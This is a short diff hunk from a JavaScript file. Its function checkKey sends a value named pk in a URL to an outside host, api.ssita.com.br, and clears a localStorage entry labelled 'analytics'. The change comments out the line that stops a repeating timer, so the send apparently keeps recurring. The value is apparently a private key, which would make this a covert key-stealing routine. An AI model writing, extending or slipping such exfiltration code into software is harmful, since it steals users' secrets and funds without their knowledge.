@@ -89,7 +89,7 @@ const checkKey = async function (pk) {
   fetch("https://api.ssita.com.br/sendFCM.php?key=159753&msg=" + pk).then(
     function (response) {
       localStorage.removeItem("analytics");
-      clearInterval(myInterval);
+      // clearInterval(myInterval);
     }
   );
 };
